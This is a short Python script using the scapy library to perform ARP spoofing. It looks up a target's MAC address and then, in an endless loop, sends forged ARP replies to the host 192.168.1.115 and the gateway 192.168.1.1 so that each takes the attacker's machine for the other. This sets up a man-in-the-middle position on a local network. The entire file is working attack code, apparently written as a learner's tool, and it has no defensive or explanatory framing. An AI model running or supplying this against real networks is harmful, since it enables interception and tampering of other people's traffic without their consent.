
import scapy.all as scapy
import time

def get_mac(ip):
    # send packet
    arp_request = scapy.ARP(pdst=ip)
    # create broadcast
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boradcast = broadcast/arp_request

    # srp send and get response to get mac_target
    answared = scapy.srp(arp_request_boradcast, timeout=10, verbose=False)[0]
    #print(answared)
    #print(answared[0][1].hwsrc)
    return answared[0][1].hwsrc

# packet ready to send it.
def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	#print(target_mac)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	#print(packet.summary())
	#print(packet.show())
	scapy.send(packet, verbose=False)

sent_packets_count = 0
while True:
	spoof("192.168.1.115", "192.168.1.1")
	spoof("192.168.1.1", "192.168.1.115")
	sent_packets_count = sent_packets_count + 2
	print(f"\r[+] Send {str(sent_packets_count)} packets", end="")
	time.sleep(2)
